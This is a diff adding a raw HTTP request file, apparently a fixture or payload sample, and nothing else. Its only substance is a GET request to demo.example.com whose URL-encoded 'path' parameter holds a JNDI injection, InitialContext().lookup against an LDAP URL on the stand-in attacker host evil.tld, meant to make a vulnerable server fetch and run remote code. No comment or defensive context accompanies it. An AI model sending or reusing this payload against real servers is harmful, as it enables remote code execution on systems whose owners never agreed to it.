@@ -1,0 +1,4 @@
+GET /a?path=l%3DInitialContext%28%29.lookup%28%22ldap%3A%2F%2Fevil.tld%2Fx%22%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
